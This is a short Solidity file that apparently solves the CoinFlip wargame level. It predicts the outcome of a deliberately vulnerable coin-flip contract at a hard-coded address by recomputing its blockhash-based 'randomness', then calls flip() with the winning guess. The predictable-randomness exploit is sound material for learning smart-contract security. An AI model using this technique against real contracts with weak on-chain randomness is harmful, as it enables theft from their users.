// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract MySolution {
    function run() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        CoinFlip myContract = CoinFlip(0x94099942864EA81cCF197E9D71ac53310b1468D8);

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        myContract.consecutiveWins();

        if (coinFlip == 1) {
            myContract.flip(true);
        } else {
            myContract.flip(false);
        }
    }
}
